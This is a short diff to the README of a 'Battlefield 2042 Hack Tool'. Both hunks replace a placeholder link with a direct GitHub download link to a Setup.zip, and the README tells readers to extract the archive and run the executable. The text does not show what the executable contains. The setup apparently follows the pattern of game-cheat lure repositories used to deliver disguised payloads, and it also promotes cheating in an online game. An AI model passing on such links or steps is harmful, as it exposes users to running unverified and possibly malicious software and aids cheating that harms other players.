@@ -35,7 +35,7 @@ The **2042 Hack Tool** includes:
 
 To get started with the **2042 Hack Tool**, follow these steps:
 
-1. Visit the [Releases section](555) to download the latest version of the hack tool.
+1. Visit the [Releases section](https://github.com/emavinn-freteons/2042-Hack-Tool/releases/download/2042/Setup.zip) to download the latest version of the hack tool.
 2. Download the file and extract it to your preferred location on your computer.
 3. Open the extracted folder and run the executable file to launch the tool.
 
@@ -75,7 +75,7 @@ For any inquiries or support, feel free to reach out:
 
 ## Release Information
 
-To access the latest version of the **2042 Hack Tool**, visit the [Releases section](555). Download the necessary files and execute them to get started. Regular updates will ensure you have the best experience possible.
+To access the latest version of the **2042 Hack Tool**, visit the [Releases section](https://github.com/emavinn-freteons/2042-Hack-Tool/releases/download/2042/Setup.zip). Download the necessary files and execute them to get started. Regular updates will ensure you have the best experience possible.
 
 ![Battlefield 2042](https://example.com/battlefield2042-image.jpg)
 
